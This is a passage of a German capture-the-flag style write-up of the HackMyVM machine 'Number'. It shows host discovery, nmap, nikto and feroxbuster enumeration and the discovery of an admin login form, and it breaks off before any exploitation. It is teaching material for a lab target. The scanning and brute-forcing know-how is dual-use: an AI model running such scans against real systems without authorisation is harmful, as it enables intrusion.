<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Number - HackMyVM - Bericht</title>
    <link rel="stylesheet" href="style.css">
	<link rel="stylesheet" href="../../horizontale-navbar.css">
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
</head>
 <body>
  
    <div class="header-bg">
        <h1>Number - HackMyVM - Level: Medium - Bericht</h1>
        <div class="level-container">
            <h2>Medium</h2>
            <div class="circle">
                <div class="segment segment-1"></div>
                <div class="segment segment-2"></div>
                <div class="segment segment-3"></div>
                <div class="inner"></div>
            </div>
        </div>
    </div>

    <div class="container">
        <section class="tools-used">
            <h2>Verwendete Tools</h2>
            <div class="tools-grid">
                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfÃ¼gen -->
                <div class="tool-item">arp-scan</div>
                <div class="tool-item">vi</div>
                <div class="tool-item">nikto</div>
                <div class="tool-item">nmap</div>
                <div class="tool-item">curl</div>
                <div class="tool-item">feroxbuster</div>
                <div class="tool-item">crunch</div>
                <div class="tool-item">wc</div>
                <div class="tool-item">wfuzz</div>
                <div class="tool-item">sqlmap</div>
                <div class="tool-item">nc</div>
                <div class="tool-item">find</div>
                <div class="tool-item">ls</div>
                <div class="tool-item">cat</div>
                <div class="tool-item">grep</div>
                <div class="tool-item">env</div>
                <div class="tool-item">getcap</div>
                <div class="tool-item">sudo</div>
                <div class="tool-item">hydra</div>
                <div class="tool-item">su</div>
                <div class="tool-item">hping3</div>
                <div class="tool-item">chmod</div>
            </div>
        </section>

        <section class="toc">
            <h2>Inhaltsverzeichnis</h2>
            <ul>
                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfÃ¼gen -->
                <li><a href="#reconnaissance">Reconnaissance</a></li>
                <li><a href="#web-enumeration">Web Enumeration</a></li>
                <li><a href="#initial-access">Initial Access</a></li>
                <li><a href="#proof-of-concept">Proof of Concept</a></li>
                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
                <li><a href="#flags">Flags</a></li>
            </ul>
        </section>

        <section id="reconnaissance">
            <h2>Reconnaissance</h2>
            <!-- Hier die Reconnaissance-Schritte einfÃ¼gen, mit Kommentaren und Code-BlÃ¶cken. -->
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">192.168.2.37</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl dient dazu, aktive Hosts im lokalen Netzwerksegment zu identifizieren. Ich verwende <code>arp-scan</code> mit dem Parameter <code>-l</code>, um das lokale Netzwerk zu scannen. Die Ausgabe pipe ich dann an <code>grep "PCS"</code>, um Zeilen zu filtern, die 'PCS' enthalten, was oft auf VirtualBox-Hardware hindeutet. Mit <code>awk '{print $1}'</code> extrahiere ich das erste Feld der gefilterten Zeile, welches die IP-Adresse ist. FÃ¼r Laien: Ich durchsuche mein lokales Netzwerk nach Computern und finde die IP-Adresse eines bestimmten GerÃ¤ts anhand seiner Hardware-Informationen. FÃ¼r Experten: Standardmethode zur schnellen Host-Entdeckung im lokalen Subnetz.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die erfolgreiche Identifizierung der IP-Adresse <code>192.168.2.37</code> liefert das Zielsystem fÃ¼r den weiteren Pentest. Es bestÃ¤tigt, dass das Ziel im selben Netzwerksegment liegt und aktiv ist.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese IP-Adresse ist nun unser Fokus. Wir werden im nÃ¤chsten Schritt detailliertere Scans durchfÃ¼hren, um offene Dienste und potenzielle Angriffsvektoren zu identifizieren.<br><strong>Empfehlung (Admin):</strong> ÃœberprÃ¼fen Sie, welche GerÃ¤te in Ihrem Netzwerksegment aktiv sind und identifizieren Sie unbekannte Hardware. Stellen Sie sicher, dass nur autorisierte Systeme verbunden sind.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">vi /etc/hosts</span></div>
                </div>
                <div class="terminal">
                    <pre>
         <span class="command">192.168.2.37 number.hmv</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich fÃ¼ge einen Eintrag in die lokale Datei <code>/etc/hosts</code> auf meinem Kali-System ein, um der gefundenen IP-Adresse <code>192.168.2.37</code> den Hostnamen <code>number.hmv</code> zuzuweisen. Dies vereinfacht die Adressierung des Zielsystems in nachfolgenden Befehlen. FÃ¼r Laien: Ich gebe der gefundenen IP-Adresse einen einfachen Namen auf meinem Computer, damit ich sie leichter verwenden kann. FÃ¼r Experten: GÃ¤ngige Praxis zur Verbesserung der Lesbarkeit und Verwaltung von Zielen wÃ¤hrend eines Pentests.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Das erfolgreiche HinzufÃ¼gen des Eintrags ist eine kleine, aber nÃ¼tzliche Vorbereitung. Es hat keine Auswirkungen auf das Zielsystem.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den Hostnamen <code>number.hmv</code> in allen weiteren Befehlen.<br><strong>Empfehlung (Admin):</strong> Keine Auswirkungen auf das Zielsystem. Relevant fÃ¼r die Organisation des Pentestenden.</p>

        </section>

        <section id="web-enumeration">
            <h2>Web Enumeration</h2>
            <!-- Beginn Web Enumeration -->

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">nikto -h http://number.hmv</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">- Nikto v2.5.0</span>
<span class="password">---------------------------------------------------------------------------</span>
<span class="command">+ Target IP:          192.168.2.37</span>
<span class="command">+ Target Hostname:    number.hmv</span>
<span class="command">+ Target Port:        80</span>
<span class="password">+ Start Time:         2025-06-11 15:32:15 (GMT2)</span>
<span class="password">---------------------------------------------------------------------------</span>
<span class="command">+ Server: nginx/1.14.2</span>
<span class="password">+ /: The anti-clickjacking X-Frame-Options header is not present. See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
<span class="password">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
<span class="command">+ No CGI Directories found (use '-C all' to force check all possible dirs)</span>
<span class="password">+ /admin/: This might be interesting.</span>
<span class="password">+ /admin/index.php: This might be interesting: has been seen in web logs from an unknown scanner.</span>
<span class="password">+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.</span>
<span class="command">+ 7962 requests: 0 error(s) and 5 item(s) reported on remote host</span>
<span class="password">+ End Time:           2025-06-11 15:32:23 (GMT2) (8 seconds)</span>
<span class="password">---------------------------------------------------------------------------</span>
<span class="command">+ 1 host(s) tested</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich setze <code>nikto</code> ein, um den Nginx-Webserver auf Port 80 (Hostname <code>number.hmv</code>) auf bekannte Schwachstellen, Konfigurationsfehler und interessante Pfade zu prÃ¼fen. FÃ¼r Laien: Ich lasse ein Programm die Webseite auf Port 80 nach bekannten 'Problemstellen' durchsuchen. FÃ¼r Experten: Nikto ist ein schnelles Werkzeug fÃ¼r die automatisierte Web-Enumeration. Es identifiziert oft fehlende Sicherheits-Header und das Vorhandensein potenziell sensibler Dateien oder interessanter Verzeichnisse.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die Nikto-Ausgabe liefert mehrere wichtige Hinweise. Sie bestÃ¤tigt den Nginx/1.14.2 Server und weist auf fehlende Sicherheits-Header hin. Besonders interessant sind die Funde des Verzeichnisses <code>/admin/</code> und der Datei <code>/admin/index.php</code>, die als 'interessant' markiert sind. Der Hinweis auf <code>/#wp-config.php#</code> ist wahrscheinlich ein False Positive, aber das Admin-Verzeichnis ist ein klares Ziel.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Verzeichnis <code>/admin/</code> und insbesondere <code>/admin/index.php</code> sind primÃ¤re Ziele fÃ¼r die weitere Untersuchung. Ich werde versuchen, auf diese Pfade zuzugreifen und ihre FunktionalitÃ¤t zu verstehen, da sie oft Anmeldeformulare oder andere administrative Funktionen enthalten. Die fehlenden Sicherheits-Header sind sekundÃ¤r, aber nÃ¼tzlich fÃ¼r den Bericht.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie essentielle Sicherheits-Header. ÃœberprÃ¼fen Sie, ob temporÃ¤re oder Backup-Dateien (wie solche mit `#` am Anfang und Ende) im Webroot liegen und zugÃ¤nglich sind. Sichern Sie Admin-Verzeichnisse und beschrÃ¤nken Sie den Zugriff darauf.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.37 | grep open</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
<span class="command">80/tcp open  http    nginx 1.14.2</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich fÃ¼hre einen Nmap-Scan mit Filterung durch, um schnell die offenen Ports zu identifizieren. Die verwendeten Flags sind <code>-sS</code> (SYN-Scan), <code>-sC</code> (Standard-Skripte), <code>-sV</code> (Versionserkennung), <code>-p-</code> (alle Ports), <code>-T5</code> (aggressives Timing) und <code>-AO</code> (OS-Erkennung). Die Ausgabe wird an <code>grep open</code> gepipet. FÃ¼r Laien: Ich klopfe an alle 'TÃ¼ren' des Computers und sehe nach, welche offen sind und welche Programme dahinterstecken, nur die offenen zeige ich mir an. FÃ¼r Experten: Schnelle Identifizierung der offenen AngriffsflÃ¤che. Die Flags ermÃ¶glichen eine umfassende Enumeration.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Nur zwei Ports sind offen: Port 22 mit einem SSH-Dienst (OpenSSH 7.9p1) und Port 80 mit einem HTTP-Dienst (nginx 1.14.2). Dies ist eine kleine AngriffsflÃ¤che.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wir konzentrieren uns nun auf die detaillierte Enumeration dieser beiden Dienste.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur absolut notwendige Dienste fÃ¼r externe Verbindungen geÃ¶ffnet sind. ÃœberprÃ¼fen Sie die Konfiguration von SSH und Nginx.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.37</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 15:31 CEST</span>
<span class="command">Nmap scan report for number.hmv (192.168.2.37)</span>
<span class="password">Host is up (0.00012s latency).</span>
Not shown: <span class="command">65533 closed tcp ports (reset)</span>
<span class="command">PORT   STATE SERVICE VERSION</span>
<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
<span class="command">| ssh-hostkey:</span>
<span class="command">|   2048 2f:90:c5:7c:a1:62:89:3a:ec:ea:c3:51:fa:77:f8:3f (RSA)</span>
<span class="command">|   256 8e:21:71:85:04:3d:a7:db:1d:e6:6f:16:27:0c:0d:c9 (ECDSA)</span>
<span class="command">|_  256 e2:39:c7:eb:f2:6d:53:0f:fd:3c:2c:05:31:c9:5b:f2 (ED25519)</span>
<span class="command">80/tcp open  http    nginx 1.14.2</span>
<span class="command">|_http-title: Site doesn't have a title (text/html).</span>
<span class="command">|_http-server-header: nginx/1.14.2</span>
<span class="command">MAC Address: 08:00:27:E0:C4:B3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
<span class="command">Device type: general purpose|router</span>
<span class="command">Running: Linux 4.X|5.X, MikroTik RouterOS 7.X</span>
<span class="command">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span>
<span class="command">OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span>
<span class="command">Network Distance: 1 hop</span>
<span class="command">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>

<span class="command">TRACEROUTE</span>
<span class="command">HOP RTT     ADDRESS</span>
<span class="command">1   0.12 ms number.hmv (192.168.2.37)</span>

<span class="password">OS and Service detection performed. Please report any incorrect results at https://nmap.org/cgi-bin/submit.cgi?new-service .</span>
<span class="password">Nmap done: 1 IP address (1 host up) scanned in 9.77 seconds</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Dies ist die vollstÃ¤ndige Ausgabe des Nmap-Scans auf dem Zielsystem. Sie enthÃ¤lt die detaillierten Informationen zu den offenen Diensten auf den Ports 22 (SSH) und 80 (Nginx), die genauen Versionsnummern (OpenSSH 7.9p1, nginx 1.14.2), SSH-Hostkeys, HTTP-Header, MAC-Adresse (VirtualBox), geschÃ¤tztes Betriebssystem (Linux), und Latenzinformationen. FÃ¼r Laien: Das ist der komplette 'Gesundheits-Check' des Computers, der mir alle Details zu den offenen 'TÃ¼ren' (Diensten) und dem 'Typ' des Computers (Betriebssystem) liefert. FÃ¼r Experten: Die genauen Versionsnummern und die OS-Erkennung sind entscheidend fÃ¼r die Recherche nach spezifischen Schwachstellen (CVEs). Die Nginx-Version 1.14.2 ist bekannt und relativ alt. Die MAC-Adresse identifiziert die Umgebung als VirtualBox.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die vollstÃ¤ndige Nmap-Ausgabe liefert alle notwendigen Details fÃ¼r die Recherche nach versionsspezifischen Schwachstellen in OpenSSH 7.9p1 und nginx 1.14.2. Die Nginx-Version ist potenziell anfÃ¤llig.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Recherchieren Sie bekannte Schwachstellen fÃ¼r OpenSSH 7.9p1 und nginx 1.14.2. Die Nginx-Version 1.14.2 sollte besonders aufmerksam geprÃ¼ft werden. Beginnen Sie die detaillierte Enumeration des Nginx-Webservers.<br><strong>Empfehlung (Admin):</strong> Halten Sie die Software auf dem neuesten Stand, um bekannte Schwachstellen zu vermeiden. Nginx 1.14.2 ist eine Ã¤ltere Version und sollte aktualisiert werden. Minimieren Sie die Informationen, die durch Server-Header und OS-Erkennung preisgegeben werden.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">x=$(curl number.hmv -Iv -s| grep "Content-Length"); clear;p=$(echo $x | awk {'print $2'})</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password"> ...</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl ist eine Kombination aus <code>curl</code> und Shell-Befehlen, um die Content-Length des HTTP-Response von der Hauptseite (<code>http://number.hmv</code>) zu extrahieren und in einer Shell-Variable zu speichern. <code>curl number.hmv -Iv -s</code> sendet eine HEAD-Anfrage (<code>-I</code>) mit verbose-Ausgabe (<code>-v</code>) an die Hauptseite, unterdrÃ¼ckt die Fortschrittsanzeige (<code>-s</code>). Die gesamte Ausgabe wird dann an <code>grep "Content-Length"</code> gepipet, um die Zeile mit der Content-Length zu finden. Diese Zeile wird in der Variable <code>x</code> gespeichert. Danach wird der Bildschirm mit <code>clear</code> gelÃ¶scht. SchlieÃŸlich wird der Inhalt von <code>x</code> an <code>echo</code> Ã¼bergeben, das Ergebnis an <code>awk {'print $2'}</code> gepipet, um das zweite Feld (den Zahlenwert der Content-Length) zu extrahieren, und dieses Ergebnis wird in der Variable <code>p</code> gespeichert. FÃ¼r Laien: Ich frage die Webseite auf der Hauptadresse (number.hmv) nach der GrÃ¶ÃŸe des Inhalts, ohne den Inhalt selbst herunterzuladen. Dann speichere ich diese GrÃ¶ÃŸe in einer 'Notiz' (einer Variable auf meinem Computer). FÃ¼r Experten: Die Extraktion der Content-Length ist oft nÃ¼tzlich, um Blind-Schwachstellen zu identifizieren, bei denen die AntwortgrÃ¶ÃŸe von der GÃ¼ltigkeit einer Bedingung abhÃ¤ngt (z.B. in Blind SQL Injection oder Blind XXE). Hier scheint es Teil eines Skripts oder einer Methode zu sein, um die normale AntwortgrÃ¶ÃŸe zu ermitteln, um sie spÃ¤ter fÃ¼r solche Blind-Techniken als Vergleichswert zu nutzen. Die Verwendung von Shell-Variablen und Pipes ist Standard in der Skripting-Umgebung.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt dient der Vorbereitung auf potenzielle Blind-Schwachstellen-Tests, indem die Standard-Content-Length der Antwort extrahiert wird. Er liefert noch keine direkten Hinweise auf Schwachstellen, zeigt aber die angewandte Methodik.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die extrahierte Content-Length kann spÃ¤ter bei Blind-Tests als Referenzwert verwendet werden. Konzentrieren Sie sich nun auf die aktive Enumeration der Webanwendung.<br><strong>Empfehlung (Admin):</strong> Standard-Verhalten des Webservers. Keine direkten Sicherheitsimplikationen, aber Teil einer Reconnaissance-Technik.</p>
        </section>

        <section id="web-enumeration">
            <h2>Web Enumeration</h2>
            <!-- Fortsetzung Web Enumeration -->

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">feroxbuster --url "http://number.hmv" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 200 301 302</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password"> ___  ___  __   __     __      __         __   ___</span>
<span class="password">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span>
<span class="password">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span>
<span class="command">by Ben "epi" Risher ğŸ¤“                 ver: 2.11.0</span>
<span class="password">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>
 <span class="command">ğŸ¯  Target Url            â”‚ http://number.hmv</span>
 <span class="command">ğŸš€  Threads               â”‚ 50</span>
 <span class="command">ğŸ“–  Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
 <span class="command">ğŸ‘Œ  Status Codes          â”‚ [200, 301, 302]</span>
 <span class="command">ğŸ’¥  Timeout (secs)        â”‚ 7</span>
 <span class="command">ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0</span>
 <span class="command">ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml</span>
 <span class="command">ğŸ”  Extract Links         â”‚ true</span>
 <span class="command">ğŸ’²  Extensions            â”‚ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]</span>
 <span class="command">ğŸ  HTTP methods          â”‚ [GET]</span>
 <span class="command">ğŸ”ƒ  Recursion Depth       â”‚ 4</span>
<span class="password">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>
 <span class="password">ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢</span>
<span class="password">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>
<span class="command">200      GET        1l        2w       11c http://number.hmv/</span>
<span class="command">200      GET        1l        2w       11c http://number.hmv/index.html</span>
<span class="command">301      GET        7l       12w      185c http://number.hmv/admin => http://number.hmv/admin/</span>
<span class="command">200      GET        1l        1w        5c http://number.hmv/admin/admincheck.php</span>
<span class="command">200      GET       12l       31w      412c http://number.hmv/admin/index.php</span>
<span class="command">200      GET        1l        1w       11c http://number.hmv/robots.txt</span>
<span class="command">200      GET        1l        3w       19c http://number.hmv/admin/command.php</span>
<span class="command">301      GET        7l       12w      185c http://number.hmv/pin => http://number.hmv/pin/</span>
<span class="command">200      GET        1l        2w       10c http://number.hmv/pin/pincheck.php</span>
<span class="command">200      GET       10l       29w      319c http://number.hmv/pin/index.php</span>
<span class="command">200      GET        1l        5w       27c http://number.hmv/pin/whoami.php</span>
<span class="password">[####################] - 19m  18526004/18526004 0s      found:11      errors:150</span>
<span class="password">[####################] - 19m  6175316/6175316 5454/s  http://number.hmv/</span>
<span class="password">[####################] - 19m  6175316/6175316 5450/s  http://number.hmv/admin/</span>
<span class="password">[####################] - 18m  6175316/6175316 5614/s  http://number.hmv/pin/</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich nutze <code>feroxbuster</code>, um Verzeichnisse und Dateien auf dem Nginx-Webserver auf Port 80 (<code>http://number.hmv</code>) zu brute-forcen. Ich verwende eine mittelgroÃŸe Wortliste und suche nach einer breiten Palette von Dateierweiterungen. Ich beschrÃ¤nke die Ergebnisse auf die Statuscodes 200, 301 und 302. FÃ¼r Laien: Ich lasse ein schnelles Programm viele Namen fÃ¼r Webseiten-Ordner und -Dateien ausprobieren, um versteckte Inhalte zu finden. FÃ¼r Experten: Feroxbuster ist ein effektives Werkzeug zur Web-Enumeration. Die Kombination von Wortliste und Extensions erhÃ¶ht die Chance, versteckte Ressourcen zu finden. Das Filtern auf spezifische Statuscodes ist wichtig, um Rauschen in den Ergebnissen zu reduzieren.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Feroxbuster findet eine Reihe interessanter Endpunkte: <code>/</code>, <code>/index.html</code> (beide Status 200, sehr kleine GrÃ¶ÃŸe 11c), die Verzeichnisse <code>/admin/</code> und <code>/pin/</code> (beide Status 301, Weiterleitung auf das Verzeichnis), und verschiedene Dateien innerhalb dieser Verzeichnisse (<code>/admin/admincheck.php</code>, <code>/admin/index.php</code>, <code>/robots.txt</code>, <code>/admin/command.php</code>, <code>/pin/pincheck.php</code>, <code>/pin/index.php</code>, <code>/pin/whoami.php</code>, alle Status 200). Die Verzeichnisse <code>/admin/</code> und <code>/pin/</code> sind besonders interessant.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun die gefundenen Verzeichnisse und Dateien manuell untersuchen. Insbesondere die Pfade im <code>/admin/</code> und <code>/pin/</code> Verzeichnis, sowie <code>/robots.txt</code> (oft ein Hinweis auf interessante Pfade) und <code>/admin/command.php</code> (klingt nach einer BefehlsausfÃ¼hrungsfunktion) und <code>/pin/pincheck.php</code> / <code>/pin/index.php</code> (deuten auf eine PIN-basierte Authentifizierung hin).<br><strong>Empfehlung (Admin):</strong> Ãœberwachen Sie Webserver-Logs auf Brute-Force-Versuche wie diesen. ÃœberprÃ¼fen Sie die ZugÃ¤nglichkeit von Admin-Verzeichnissen und entfernen oder schÃ¼tzen Sie unnÃ¶tige Dateien (wie robots.txt, wenn sie sensitive Informationen preisgeben).</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
<span class="command">http://number.hmv/robots.txt</span>

<span class="password">whoami.php</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich greife auf die Datei <code>/robots.txt</code> auf dem Webserver zu. Diese Datei wird von Webcrawlern gelesen, um zu erfahren, welche Bereiche einer Website nicht indexiert werden sollen, kann aber auch Hinweise fÃ¼r Angreifer enthalten. Die Ausgabe zeigt den Inhalt der Datei: einfach die Zeichenkette <code>whoami.php</code>. FÃ¼r Laien: Ich schaue in eine spezielle Datei, die Suchmaschinen sagt, wo sie nicht hinschauen sollen. Manchmal steht da auch etwas anderes Interessantes drin. Hier steht nur der Name einer anderen Webseite-Datei: <code>whoami.php</code>. FÃ¼r Experten: Das Auflisten einer Datei in <code>robots.txt</code> deutet oft darauf hin, dass der Entwickler mÃ¶chte, dass diese Datei nicht Ã¶ffentlich bekannt wird (fÃ¼r Suchmaschinen), was sie fÃ¼r einen Angreifer interessant macht. Das Vorhandensein von <code>whoami.php</code> im Root-Verzeichnis (da kein anderer Pfad angegeben ist) ist ein Hinweis auf eine potenziell interessante Datei.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Inhalt von <code>/robots.txt</code> liefert den Namen einer potenziell interessanten Datei: <code>whoami.php</code>. Diese Datei kÃ¶nnte Informationen Ã¼ber den Webserver-Benutzer preisgeben.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde versuchen, auf die Datei <code>http://number.hmv/whoami.php</code> zuzugreifen, um ihren Inhalt zu sehen.<br><strong>Empfehlung (Admin):</strong> Verwenden Sie <code>robots.txt</code> nur fÃ¼r seinen beabsichtigten Zweck. Listen Sie keine sensiblen Dateien oder Pfade auf, auch wenn Sie nicht mÃ¶chten, dass Suchmaschinen sie indexieren.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
<span class="command">http://number.hmv/whoami.php</span>

<span class="command">404 Not Found</span>
<span class="command">nginx/1.14.2</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich versuche, auf die in <code>robots.txt</code> gefundene Datei <code>http://number.hmv/whoami.php</code> zuzugreifen. Die Antwort des Servers ist <code>404 Not Found</code>. FÃ¼r Laien: Ich habe versucht, die Webseite-Datei <code>whoami.php</code> zu besuchen, aber der Computer hat gesagt, dass er sie nicht finden kann. FÃ¼r Experten: Ein 404-Fehler bedeutet, dass die angeforderte Ressource auf dem Server nicht gefunden wurde. Obwohl <code>robots.txt</code> die Datei auflistet, scheint sie entweder nicht (mehr) unter diesem Pfad zu existieren, oder es gibt eine andere Konfiguration, die den Zugriff verhindert. Dies ist etwas unerwartet, da sie in <code>robots.txt</code> genannt wurde.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die Datei <code>whoami.php</code> ist unter dem erwarteten Pfad nicht zugÃ¤nglich. Dies eliminiert diesen spezifischen Hinweis als direkten Angriffsvektor im Moment.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Obwohl der direkte Zugriff fehlschlÃ¤gt, notieren Sie den Dateinamen. MÃ¶glicherweise existiert er unter einem anderen Pfad (z.B. innerhalb von <code>/admin/</code> oder <code>/pin/</code>) oder wird auf eine andere Weise verwendet. Konzentrieren Sie sich nun auf die anderen gefundenen interessanten Pfade.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass <code>robots.txt</code> keine veralteten oder falschen Informationen enthÃ¤lt.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
<span class="password">view-source:http://number.hmv/admin/index.php</span>
<span class="password">LOGIN</span>

 <span class="command">form action="admincheck.php" method="post"</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich untersuche den Quellcode der Datei <code>/admin/index.php</code> im <code>/admin/</code> Verzeichnis, das von Nikto und Feroxbuster gefunden wurde. Der Quellcode zeigt eine einfache HTML-Seite mit dem Titel "LOGIN" und einem Formular. Das Formular sendet Daten (<code>method="post"</code>) an das Skript <code>admincheck.php</code>. FÃ¼r Laien: Ich schaue mir die Seite im Ordner <code>/admin</code> an und finde dort eine Anmeldeseite. Der Bauplan der Seite zeigt, dass man Benutzername und Passwort in ein Formular eingeben kann, und das Programm <code>admincheck.php</code> prÃ¼ft dann, ob sie richtig sind. FÃ¼r Experten: Die Identifizierung eines Login-Formulars ist Standard bei der Web-Enumeration. Das Formular auf <code>/admin/index.php</code> sendet die Anmeldedaten an <code>admincheck.php</code> mittels POST. Dies ist der Zugangspunkt zum Admin-Bereich, der Brute-Force-Angriffe oder die Suche nach Anmeldedaten erfordert.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Ein Anmeldeformular fÃ¼r den Admin-Bereich wurde gefunden. Dies ist ein wichtiger Zugangspunkt, der die Kompromittierung von Anmeldedaten (durch Brute-Force, WÃ¶rterbuchangriffe oder das Ausnutzen anderer Schwachstellen) erfordert, um Zugriff auf den Admin-Bereich zu erhalten.</p>
